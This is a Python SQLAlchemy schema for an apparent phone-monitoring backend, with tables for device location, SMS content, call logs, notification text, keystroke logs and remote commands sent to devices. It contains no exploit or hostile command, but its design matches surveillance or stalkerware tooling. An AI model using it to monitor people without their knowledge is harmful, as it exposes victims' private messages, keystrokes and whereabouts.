from datetime import datetime, timedelta
import json
from typing import List, Optional, Dict, Any, Union
from sqlalchemy import Column, Integer, String, DateTime, Boolean, Float, Text, ForeignKey, JSON, func, and_
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from sqlalchemy.orm import declarative_base, relationship

Base = declarative_base()

def get_time_filter(time_range: str) -> datetime:
    """Calculate the timestamp for filtering based on time range."""
    now = datetime.utcnow()
    
    if time_range == "24h":
        return now - timedelta(hours=24)
    elif time_range == "7d":
        return now - timedelta(days=7)
    elif time_range == "30d":
        return now - timedelta(days=30)
    else:  # "all"
        return datetime(1970, 1, 1)  # Beginning of time


class User(Base):
    __tablename__ = "users"
    
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True, nullable=False)
    hashed_password = Column(String, nullable=True)  # Nullable for Firebase auth
    full_name = Column(String)
    firebase_uid = Column(String, unique=True, index=True, nullable=True)
    is_active = Column(Boolean, default=True)
    is_superuser = Column(Boolean, default=False)
    is_verified = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    commands = relationship("Command", back_populates="user")
    
    @classmethod
    async def get_by_id(cls, db: AsyncSession, user_id: int) -> Optional["User"]:
        result = await db.execute(select(cls).filter(cls.id == user_id))
        return result.scalars().first()
    
    @classmethod
    async def get_by_email(cls, db: AsyncSession, email: str) -> Optional["User"]:
        result = await db.execute(select(cls).filter(cls.email == email))
        return result.scalars().first()
    
    @classmethod
    async def get_by_firebase_uid(cls, db: AsyncSession, firebase_uid: str) -> Optional["User"]:
        result = await db.execute(select(cls).filter(cls.firebase_uid == firebase_uid))
        return result.scalars().first()


class Device(Base):
    __tablename__ = "devices"
    
    id = Column(String, primary_key=True, index=True)  # UUID provided by client
    manufacturer = Column(String)
    model = Column(String)
    os_version = Column(String)
    firebase_token = Column(String, nullable=True)
    last_seen = Column(DateTime, default=datetime.utcnow)
    created_at = Column(DateTime, default=datetime.utcnow)
    battery_level = Column(Integer, nullable=True)
    is_charging = Column(Boolean, nullable=True)
    network_type = Column(String, nullable=True)
    available_storage = Column(Integer, nullable=True)
    total_storage = Column(Integer, nullable=True)
    
    # Relationships
    locations = relationship("DeviceLocation", back_populates="device")
    sms_logs = relationship("SmsLog", back_populates="device")
    call_logs = relationship("CallLog", back_populates="device")
    notification_logs = relationship("NotificationLog", back_populates="device")
    key_logs = relationship("KeyLog", back_populates="device")
    file_logs = relationship("FileLog", back_populates="device")
    commands = relationship("Command", back_populates="device")
    
    @classmethod
    async def get_by_id(cls, db: AsyncSession, device_id: str) -> Optional["Device"]:
        result = await db.execute(select(cls).filter(cls.id == device_id))
        return result.scalars().first()
    
    @classmethod
    async def get_all(cls, db: AsyncSession, skip: int = 0, limit: int = 100) -> List["Device"]:
        result = await db.execute(
            select(cls)
            .order_by(cls.last_seen.desc())
            .offset(skip)
            .limit(limit)
        )
        return result.scalars().all()


class DeviceLocation(Base):
    __tablename__ = "device_locations"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    latitude = Column(Float, nullable=False)
    longitude = Column(Float, nullable=False)
    accuracy = Column(Float)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    device = relationship("Device", back_populates="locations")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 50
    ) -> List["DeviceLocation"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class SmsLog(Base):
    __tablename__ = "sms_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    phone_number = Column(String, nullable=False)
    contact_name = Column(String, nullable=True)
    message = Column(Text, nullable=False)
    type = Column(String, nullable=False)  # 'sent' or 'received'
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    device = relationship("Device", back_populates="sms_logs")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 100
    ) -> List["SmsLog"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class CallLog(Base):
    __tablename__ = "call_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    phone_number = Column(String, nullable=False)
    contact_name = Column(String, nullable=True)
    type = Column(String, nullable=False)  # 'incoming', 'outgoing', 'missed'
    duration = Column(Integer, nullable=True)  # in seconds
    timestamp = Column(DateTime, default=datetime.utcnow)
    status = Column(String, nullable=True)  # 'answered', 'rejected', etc.
    
    # Relationship
    device = relationship("Device", back_populates="call_logs")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 100
    ) -> List["CallLog"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class NotificationLog(Base):
    __tablename__ = "notification_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    app_name = Column(String, nullable=False)
    title = Column(String, nullable=True)
    text = Column(Text, nullable=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    device = relationship("Device", back_populates="notification_logs")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 100
    ) -> List["NotificationLog"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class KeyLog(Base):
    __tablename__ = "key_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    application = Column(String, nullable=False)
    text = Column(Text, nullable=False)
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    device = relationship("Device", back_populates="key_logs")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 100
    ) -> List["KeyLog"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class FileLog(Base):
    __tablename__ = "file_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    path = Column(String, nullable=False)
    operation = Column(String, nullable=False)  # 'read', 'write', 'delete'
    size = Column(Integer, nullable=True)  # in bytes
    timestamp = Column(DateTime, default=datetime.utcnow)
    
    # Relationship
    device = relationship("Device", back_populates="file_logs")
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        time_filter: datetime = None,
        limit: int = 100
    ) -> List["FileLog"]:
        query = select(cls).filter(cls.device_id == device_id)
        
        if time_filter:
            query = query.filter(cls.timestamp >= time_filter)
        
        query = query.order_by(cls.timestamp.desc()).limit(limit)
        
        result = await db.execute(query)
        return result.scalars().all()


class Command(Base):
    __tablename__ = "commands"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    command = Column(String, nullable=False)
    params = Column(JSON, nullable=True)
    status = Column(String, nullable=False, default="pending")  # 'pending', 'sent', 'completed', 'failed'
    response = Column(Text, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    device = relationship("Device", back_populates="commands")
    user = relationship("User", back_populates="commands")
    
    @classmethod
    async def get_by_id(cls, db: AsyncSession, command_id: int) -> Optional["Command"]:
        result = await db.execute(select(cls).filter(cls.id == command_id))
        return result.scalars().first()
    
    @classmethod
    async def get_by_device_id(
        cls, 
        db: AsyncSession, 
        device_id: str, 
        limit: int = 50
    ) -> List["Command"]:
        query = select(cls).filter(cls.device_id == device_id).order_by(cls.created_at.desc()).limit(limit)
        result = await db.execute(query)
        return result.scalars().all()
    
    def get_params_dict(self) -> Dict[str, Any]:
        """Convert JSON params to dict."""
        if isinstance(self.params, str):
            return json.loads(self.params)
        return self.params or {}
